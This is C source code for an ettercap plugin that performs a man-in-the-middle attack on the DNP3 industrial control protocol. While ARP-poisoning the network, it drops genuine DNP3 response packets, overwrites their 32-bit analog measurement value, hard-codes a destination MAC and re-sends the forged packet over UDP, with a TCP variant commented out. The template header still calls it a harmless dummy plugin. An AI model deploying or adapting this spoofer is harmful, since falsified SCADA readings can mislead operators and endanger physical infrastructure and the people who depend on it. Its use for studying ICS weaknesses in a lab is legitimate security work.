/*
    dummy -- ettercap plugin -- it does nothig !
                                only demostrates how to write a plugin !
								
    Copyright (C) ALoR & NaGA
    
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.
	
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
	
    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
	
*/


#include <ec.h>                        /* required for global variables */
#include <ec_plugins.h>                /* required for plugin ops */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ec_packet.h>
#include <ec_hook.h>
#include <ec_send.h>
#include <ec_session_tcp.h>

/* DNP3 protocol start word (0x0564) */

u_char START1 = 0x05;
u_char START2 = 0x64;

/*	In this example we are only interested in modifying response packets with the hexadecimal type 81.
	Specifically 81 packets with length 26 that are responses with analog values. (There are other 81 packets)
	To modify other DNP3 packets, these values must be edited.
*/
u_char response = 0x81;
u_int8 aux = 26;

/*	This structure also corresponds to response packets with the hexadecimal type 81.
	To modify other DNP3 packets, the Application Layer of the structure should be edited following
	the data stream of the packet on a packet analyzer (ex: Wireshark)
	
	Unlike the IEC 104 MITM file, this struct wasnt seperated due to the protocol having large data chunks (16+ bits)
*/
struct dnp_data {
  //Data Link Layer - Header Block
  u_char start1;
  u_char start2;
  u_int8 length;	//5 to 255
  //Control octet
  u_char cfc : 4;	//Control Function Code
  u_char fcv : 1;	//Frame Count Valid
  u_char fcb : 1;	//Frame Count Bit
  u_char prm : 1;	//Primary
  u_char dir : 1;	//Direction 
  u_int to : 16;	//Destination - 0 to 65535
  u_int from : 16;	//Source - 0 to 65519
  u_int crc : 16;	//Checksum
  
 /*---------------------------------------------------------------------*/ 
  //Transport Control
  u_char sq : 6;	//Sequence
  u_char fir : 1;	//First
  u_char fin : 1;	//Final
  
  /*--------------------------------------------------------------------*/
  //Application Layer
  //Application Header
  u_char app_seq : 4;	//Sequence
  u_char uns : 1;		//Unsolicited
  u_char con : 1;		//Confirm
  u_char app_fin : 1;	//Final
  u_char app_fir : 1;	//First
  
  //Function Code
  u_char func_code;
  
  //Internal Indications
  u_char bmr : 1;		//Broadcast Msg Rx
  u_char c1 : 1;		//Class 1 Data Available
  u_char c2 : 1;		//Class 2 Data Available
  u_char c3 : 1;		//Class 3 Data Available
  u_char tsr : 1;		//Time Sync Required
  u_char dol : 1;		//Digital Outputs in Local
  u_char dev_t : 1;		//Device Trouble
  u_char dev_r : 1;		//Device Restart
 
  u_char fcni : 1;		//Function Code not implemented
  u_char rou : 1;		//Requested Objects Unknown
  u_char pi : 1;		//Parameters Invalid or Out of Range
  u_char ebo : 1;		//Event Buffer Overflow
  u_char oae : 1;		//Operation Already Executing
  u_char cc : 1;		//Configuration Corrupt
  u_char blank : 2;
  
  //Object 1 Header
  //Object 1 Type
  u_int obj : 8;		//Object 1 Group
  u_int var : 8;		//Object 1 Variation
   
  //Qualifier Field
  u_char range : 4;		//Range Code - 8-bit Start and Stop Indices
  u_char prefix : 3;	//Prefix Code
  
  u_char blank1 : 1;
  
  //Number of Items Object 1
  u_char start8 : 8;
  u_char stop8 : 8;
  
  //Point Number
  //Quality
  u_char online : 1;	//Online
  u_char reset : 1;		//Restart
  u_char com_f : 1;		//Comm Fail
  u_char rf : 1;		//Remote Force
  u_char lf : 1;		//Local Force
  u_char cf : 1;		//Chatter Filter
  u_char reserv : 1;	//Reserved
  u_char p_value : 1;	//Point Value
   
  
  //Object 2 Header
  //Object 2 Type
  u_int obj2 : 8;		//Object 2 Group
  u_int var2 : 8;		//Object 2 Variation
  
  //Qualifier Field
  u_char range2 : 4;	//Range Code - 8-bit Start and Stop Indices
  u_char prefix2 : 3;	//Prefix Code
  
  u_char blank2 : 1;
  
  //Number of Items Object 2
  u_char start8_2 : 8;
  u_char stop8_2 : 8;
  
  u_int crc1 : 16;		//Checksum Data Chunk 0
  
  //Quality
  u_char online2 : 1;	//Online
  u_char reset2 : 1;	//Restart
  u_char com_f2 : 1;	//Comm Fail
  u_char rf2 : 1;		//Remote Force
  u_char lf2 : 1;		//Local Force
  u_char or : 1;		//Over-Range 
  u_char rc : 1;		//Reference Check
  u_char reserv2 : 1;	//Reserved
  
  //Value 32 bits
  u_int val4 : 8;		// All 32 bits of the value are separated in 8bit increments
  u_int val3 : 8;		// Full value is: val1 val2 val3 val4, where val1 contains the MSBs and val4 the LSBs
  u_int val2 : 8;		// To edit this value, the decimal number should be converted to hexadecimal and edited accordingly
  u_int val1 : 8;		// Ex: 30 would be 00 00 00 1e or 0000 0000  0000 0000  0000 0000  0001 1110
  
  u_int crc2 : 16;		//Checksum Data Chunk 1
};


/* prototypes is required for -Wmissing-prototypes */

/* 
 * this function must be present.
 * it is the entry point of the plugin 
 */
int plugin_load(void *);

/* additional functions */
static int MITM_DNP3_spoof_init(void *);
static int MITM_DNP3_spoof_fini(void *);
static void parse_tcp(struct packet_object *po);
static void print_dnp(struct dnp_data *dd);

/* plugin operations */

struct plugin_ops MITM_DNP3_spoof_ops = { 
   /* ettercap version MUST be the global EC_VERSION */
   .ettercap_version =  EC_VERSION,                        
   /* the name of the plugin */
   .name =              "MITM_DNP3_spoof",  
    /* a short description of the plugin (max 50 chars) */                    
   .info =              "Spoofs DNP3 Response Packets while being MITM",  
   /* the plugin version. */ 
   .version =           "1.0",   
   /* activation function */
   .init =              &MITM_DNP3_spoof_init,
   /* deactivation function */                     
   .fini =              &MITM_DNP3_spoof_fini,
};

/**********************************************************/

/* this function is called on plugin load */
int plugin_load(void *handle) 
{
   DEBUG_MSG("MITM DNP3 spoof plugin load function.");
   /*
    *  in this fuction we MUST call the registration procedure that will set
    *  up the plugin according to the plugin_ops structure.
    *  the returned value MUST be the same as plugin_register()
    *  the opaque pointer params MUST be passed to plugin_register()
    */
   return plugin_register(handle, &MITM_DNP3_spoof_ops);
}

/*********************************************************/

static int MITM_DNP3_spoof_init(void *dummy) 
{
   /* the control is given to this function
    * and ettercap is suspended until its return.
    * 
    * you can create a thread and return immediately
    * and then kill it in the fini function.
    *
    * you can also set an hook point with
    * hook_add(), in this case you have to set the
    * plugin type to PL_HOOK.
    */

   USER_MSG("MITM DNP3 spoof: Plugin running...\n");

   /* For TCP packets, change HOOK_PACKET_UDP to HOOK_PACKET_TCP */
   hook_add(HOOK_PACKET_UDP, &parse_tcp);
   
   /* return PLUGIN_FINISHED if the plugin has terminated
    * its execution.
    * return PLUGIN_RUNNING if it has spawned a thread or it
    * is hooked to an ettercap hookpoint and
    * it needs to be deactivated with the fini method.
    */
   return PLUGIN_RUNNING;
}

static int MITM_DNP3_spoof_fini(void *dummy) 
{
   /* 
    * called to terminate a plugin.
    * usually to kill threads created in the 
    * init function or to remove hook added 
    * previously.
    */
   USER_MSG("MITM DNP3 spoof: Plugin finalization.\n");

   /* For TCP packets, change HOOK_PACKET_UDP to HOOK_PACKET_TCP */
   hook_del(HOOK_PACKET_UDP, &parse_tcp); 

   return PLUGIN_FINISHED;
}

static void parse_tcp(struct packet_object *po)
{

  /* don't show packets while operating */
  EC_GBL_OPTIONS->quiet = 1;

  struct dnp_data *dd;
  dd = (struct dnp_data *)po->DATA.data;
	
  /*	We are interested in monitoring DNP3 packets of type Response 0x81 and length 26.
		This can also be used to filter packets with more precision, such as packets with certain dst or src ips 
  */
  if(START1 == dd->start1 && START2 == dd->start2 && response == dd->func_code && aux == dd->length) {

	/* Debug message for original packet */
    USER_MSG("=========================");
    USER_MSG("\nOriginal Packet\n");
	print_dnp(dd);
    USER_MSG("=========================\n");
    
    /* We can't inject in unoffensive mode or in bridge mode or while the read flag (prevents the LAN from being 
	   scanned) is active. 
	*/
	//Debug
    //USER_MSG("unoffensive:%d\n read:%d\n iface_bridge:%d\n", EC_GBL_OPTIONS->unoffensive, EC_GBL_OPTIONS->read, EC_GBL_OPTIONS->iface_bridge);
    if (EC_GBL_OPTIONS->unoffensive || EC_GBL_OPTIONS->read || (EC_GBL_OPTIONS->iface_bridge && EC_GBL_OPTIONS->iface_bridge<1000 && EC_GBL_OPTIONS->iface_bridge>0)) {
      USER_MSG("\n[!!] We can't inject in unoffensive mode or in bridge mode.\n");
      return E_INVALID;
    } 
	
	
    /* Prevent the original packet from being sent */
    po->flags ^= PO_DROPPED;
	
    /* Modify intended value */
    u_long value = 40;			 //To modify the value field (32bit analog)
	dd->val4 = (value & 0xff);	
	dd->val3 = ((value >> 8) & 0xff);		
	dd->val2 = ((value >> 16) & 0xff);		
	dd->val1 = (value >> 24);
	
	/*	UDP requires destination mac address. As we are ARP poisoning, the original mac address must be copied
	from a packet dissector to the packet destination.
	[!]Comment lines for TCP
	*/
	po->L2.dst[0] = 0x94;
	po->L2.dst[1] = 0xde;
	po->L2.dst[2] = 0x80;
	po->L2.dst[3] = 0x29;
	po->L2.dst[4] = 0x7a;
	po->L2.dst[5] = 0x0d;
	
	/* Copy information to original structure */
    memcpy(po->DATA.data, dd, sizeof(dd));

    /* Debug message for altered packet */
    USER_MSG("=========================");
    USER_MSG("\nModified Packet\n");
    print_dnp(dd);
    USER_MSG("=========================\n");

    /* Send modified packet (UDP)*/
		//Send function args
		//int 	send_udp (struct ip_addr *sip, struct ip_addr *tip, u_int8 *tmac, u_int16 sport, u_int16 dport, u_int8 *payload, size_t length)
		//DEBUG message
	//USER_MSG("po->L2.flags:%x, po->L2.flags:%x,po->L4.src:%x, po->L4.dst:%x\n", po->L2.dst[0], po->L2.dst[1], po->L4.src, po->L4.dst);
		//Send function
	send_udp(&po->L3.src, &po->L3.dst, po->L2.dst, po->L4.src, po->L4.dst, po->DATA.data, po->DATA.disp_len);
	
	/* Send modified packet (TCP)*/
		//Send funtion args
		//int 	send_tcp (struct ip_addr *sip, struct ip_addr *tip, u_int16 sport, u_int16 dport, u_int32 seq, u_int32 ack, u_int8 flags, u_int8 *payload, size_t length)
		//DEBUG message
    //USER_MSG("po->L4.seq:%lu ,po->L4.ack: %lu, TH_ACK: %d, po->DATA.disp_len: %d\n",po->L4.seq, po->L4.ack, TH_PSH|TH_ACK, po->DATA.disp_len );
		//Send function
	//send_tcp(&po->L3.src, &po->L3.dst, po->L4.src, po->L4.dst, po->L4.seq, po->L4.ack, TH_PSH|TH_ACK, po->DATA.data, po->DATA.disp_len);
  
	/*	The packet object struct has 4 layers, but only 3 of them are relevant in this case:
		L2 - Eth;
		L3 - IP;
		L4 - TCP/UDP (It detects the protocol automatically).	
	*/
  
  
  }
}

/* Debug print messages */

static void print_dnp(struct dnp_data *dd)
{
  //Calculates entire byte
  u_char calc = ((dd->dir << 7) | (dd->prm << 6) | (dd->fcb << 5) | (dd->fcv << 4) | dd->cfc);
  USER_MSG("\n[-] Data Link Layer\n[+] START: \t0x%x%x \n[+] Length: \t%d \n[+] Control: \t0x%x \n[+] Destination: %d \n[+] Source: \t%d \n[+] CRC: \t%x \n", 
      dd->start1, dd->start2, dd->length, calc, dd->to, dd->from, dd->crc);
  USER_MSG("\n[*] Control bits:\n DIR: %d - PRM: %d - FCB: %d - FCV: %d - CFC: %d\n",
    dd->dir, dd->prm, dd->fcb, dd->fcv, dd->cfc);
  
  /*--------------------------------------------------------------------*/
  
  //Calculates entire byte
  u_char calc2 = ((dd->fin << 7) | (dd->fir << 6) | dd->sq);
  USER_MSG("\n[-] Transport Control : 0x%x\n", 
    calc2);
  USER_MSG("[*] FIN: %d - FIR: %d - Sequence: %d\n",
    dd->fin, dd->fir, dd->sq);
  
  /*--------------------------------------------------------------------*/
  
  //Calculates entire byte
  u_char calc3 = ((dd->app_fir << 7) | (dd->app_fin << 6) | (dd->con << 5) | (dd->uns << 4) | dd->app_seq);
  USER_MSG("\n[-] Application Layer\n[-] Control: \t0x%x \n", 
      calc3);
  USER_MSG("[*] FIR: %d - FIN: %d - CON: %d - UNS: %d - Sequence: %d\n",
    dd->app_fir, dd->app_fin, dd->con, dd->uns, dd->app_seq);
  USER_MSG("[+] Function Code: \t0x%x \n", 
      dd->func_code);
  
  //Calculates entire word of internal indications
  u_int calc4 = ((dd->dev_r << 15) | (dd->dev_t << 14) | (dd->dol << 13) | (dd->tsr << 12) | (dd->c3 << 11) | 
  (dd->c2 << 10) | (dd->c1 << 9) | (dd->bmr << 8) | (dd->cc << 5) | (dd->oae << 4) | (dd->ebo << 3) | 
  (dd->pi << 2) | (dd->rou << 1) | dd->fcni);
  USER_MSG("[-] Internal Indications: \t0x%x \n", 
      calc4);
  USER_MSG("[*] DR: %d - DT: %d - DOL: %d - TSR: %d - C3: %d - C2: %d - C1: %d - BMRx: %d\n",
    dd->dev_r, dd->dev_t, dd->dol, dd->tsr, dd->c3, dd->c2, dd->c1, dd->bmr);
  USER_MSG("[*] CC: %d - OAE: %d - EBO: %d - PI: %d - ROU: %d - FCNI: %d\n",
    dd->cc, dd->oae, dd->ebo, dd->pi, dd->rou, dd->fcni);
	
  /*-------------------Object 1--------------------*/

  //Calculates entire word of object header
  u_int calc5 = ((dd->obj << 8) | dd->var);
  USER_MSG("\n[-] Object 1 Header: 0x%x\n[+] Object 1 Group: \t0x%x\n[+] Object 1 Variation: 0x%x\n", 
      calc5, dd->obj, dd->var);
	  
  USER_MSG("[-] Qualifier Field \n");
  USER_MSG("[*] Prefix: %d - Range: %d\n",
    dd->prefix, dd->range);
	
  USER_MSG("[-] Number of items \n");
  USER_MSG("[*] Start: %d - Stop: %d\n",
    dd->start8, dd->stop8);
	
  USER_MSG("[-] Point Number \n");
  USER_MSG("[+] Quality: \n");
  USER_MSG("[*] PV: %d - Rsrv: %d - CF: %d - LF: %d - RF: %d - CommF: %d - Rst: %d - On: %d\n",
    dd->p_value, dd->reserv, dd->cf, dd->lf, dd->rf, dd->com_f, dd->reset, dd->online);

  /*-------------------Object 2--------------------*/
  
  //Calculates entire word of object header
  u_int calc6 = ((dd->obj2 << 8) | dd->var2);
  USER_MSG("\n[-] Object 2 Header: 0x%x\n[+] Object 2 Group: \t0x%x\n[+] Object 2 Variation: 0x%x\n", 
      calc6, dd->obj2, dd->var2);
	  
  USER_MSG("[-] Qualifier Field \n");
  USER_MSG("[*] Prefix: %d - Range: %d\n",
    dd->prefix2, dd->range2);
	
  USER_MSG("[-] Number of items \n");
  USER_MSG("[*] Start: %d - Stop: %d\n",
    dd->start8_2, dd->stop8_2);
  
  /*----------------------------------*/
  USER_MSG("[+] CRC Data Chunk 0: \t%x \n", 
      dd->crc1);
  /*----------------------------------*/
	
  USER_MSG("[-] Point Number: \n");
  USER_MSG("[+] Quality: \n");
  USER_MSG("[*] Rsrv: %d - RC: %d - OR: %d - LF: %d - RF: %d - CommF: %d - Rst: %d - On: %d\n",
    dd->reserv2, dd->rc, dd->or, dd->lf2, dd->rf2, dd->com_f2, dd->reset2, dd->online2);

  //Calculates entire 32 bit value to display in decimal
  u_long calc7 = ((dd->val1 << 24) | (dd->val2 << 16) | (dd->val3 << 8) | dd->val4);
  USER_MSG("[+] Value: %d (0x%x%x%x%x) \n", 
      calc7, dd->val1,dd->val2,dd->val3,dd->val4);
	  
  /*----------------------------------*/
  USER_MSG("[+] CRC Data Chunk 1: \t%x \n", 
      dd->crc2);
  /*----------------------------------*/  
}

/* EOF */

// vim:ts=3:expandtab